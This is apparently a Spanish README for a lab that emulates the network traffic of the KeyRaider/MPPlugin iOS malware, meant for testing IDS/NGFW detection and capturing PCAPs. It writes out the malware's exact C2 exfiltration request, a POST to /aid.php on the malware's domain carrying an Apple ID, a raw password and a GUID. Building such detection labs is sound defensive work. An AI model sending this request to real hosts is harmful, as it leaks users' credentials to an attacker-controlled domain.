# Laboratorio KeyRaider / MPPlugin

Este laboratorio genera el flujo de red analizado para MPPlugin:

1. Resolución DNS de `p12-buy.itunes.apple.com`.
2. Flujo TLS 1.2 con SNI `p12-buy.itunes.apple.com`.
3. Resolución DNS de `www.wushidou.cn`.
4. Exfiltración HTTP clara a `POST /aid.php` con `Host: www.wushidou.cn`.

El contenido TLS interno se incluye como contexto de login iTunes/App Store, pero lo representativo para un IDS/NGFW sin descifrado es el SNI y TLS 1.2. El flujo C2 HTTP sí replica la estructura visible atribuible a MPPlugin.

## Archivos

- `Corefile`: CoreDNS en puerto 53, modo fiel para PCAP.
- `Corefile.dev`: CoreDNS en puerto 1053, útil si no quieres privilegios o ya tienes DNS en 53.
- `keyraider.hosts`: mapeo DNS de los dos dominios al servidor del laboratorio.
- `lab_server.py`: servidor TLS Apple + servidor HTTP C2.
- `lab_client.py`: cliente que genera DNS, TLS Apple y HTTP C2.

## Ejecución recomendada para pruebas sin privilegios

Terminal 1:

```powershell
coredns.exe -conf .\outputs\keyraider_lab\Corefile.dev
```

Terminal 2:

```powershell
python .\outputs\keyraider_lab\lab_server.py --bind-host 127.0.0.1 --tls-port 8443 --c2-port 8080
```

Terminal 3:

```powershell
python .\outputs\keyraider_lab\lab_client.py --dns-server 127.0.0.1 --dns-port 1053 --tls-port 8443 --c2-port 8080
```

## Ejecución fiel para PCAP

Edita `keyraider.hosts` si el servidor no corre en `127.0.0.1`. Después:

```powershell
coredns.exe -conf .\outputs\keyraider_lab\Corefile
python .\outputs\keyraider_lab\lab_server.py --bind-host 0.0.0.0 --tls-port 443 --c2-port 80
python .\outputs\keyraider_lab\lab_client.py --dns-server <IP_DNS_LAB> --dns-port 53 --tls-port 443 --c2-port 80
```

## Firma C2 generada

El request HTTP C2 generado por el cliente tiene esta forma exacta:

```http
POST /aid.php HTTP/1.1
Host: www.wushidou.cn
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

id=<APPLE_ID_URLENCODED>&name=<APPLE_ID_URLENCODED>&pass=<PASSWORD_RAW>&guid=<GUID_RAW>
```

Por defecto, el servidor responde con:

```http
HTTP/1.1 200 OK
Content-Length: 2

OK
```

También puedes emitir respuestas aceptadas por el parser HTTP del malware:

```powershell
python .\outputs\keyraider_lab\lab_server.py --c2-response chunked
python .\outputs\keyraider_lab\lab_server.py --c2-response gzip
```

## Parada

`lab_server.py` maneja `Ctrl+C` y cierra ambos servicios. CoreDNS también puede pararse con `Ctrl+C`.

## Limitación consciente

Python `ssl` permite fijar TLS 1.2 y SNI, pero no reproduce byte a byte un ClientHello histórico de iOS 2015. Para una huella JA3 idéntica haría falta una pila TLS controlable a bajo nivel. Para este laboratorio se conserva lo representativo y defendible del análisis: DNS/SNI `p12-buy.itunes.apple.com`, TLS 1.2 y el C2 HTTP exacto de MPPlugin.
